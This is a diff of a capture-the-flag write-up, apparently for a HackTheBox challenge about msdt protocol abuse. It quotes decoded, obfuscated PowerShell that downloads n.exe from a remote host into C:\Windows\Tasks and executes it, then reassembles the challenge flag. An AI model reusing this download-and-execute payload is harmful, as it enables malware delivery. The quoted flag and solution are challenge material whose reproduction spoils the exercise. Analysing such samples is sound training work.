@@ -40,11 +40,10 @@ decoder the strings in base64 it say : ```${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{
 &("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
 &((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92) ```
 
-Now you can see in this arry : ### ```'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD') ```
-
+Now you can see in this arry : ```'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD') ```
+---
 the index value of the flag is give : ```"{7}{1}{6}{8}{5}{3}{2}{4}{0}"``` 
-
-
+---
 Now reassmble the string you will the flag
 
 ### Flag  is : ```HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}```
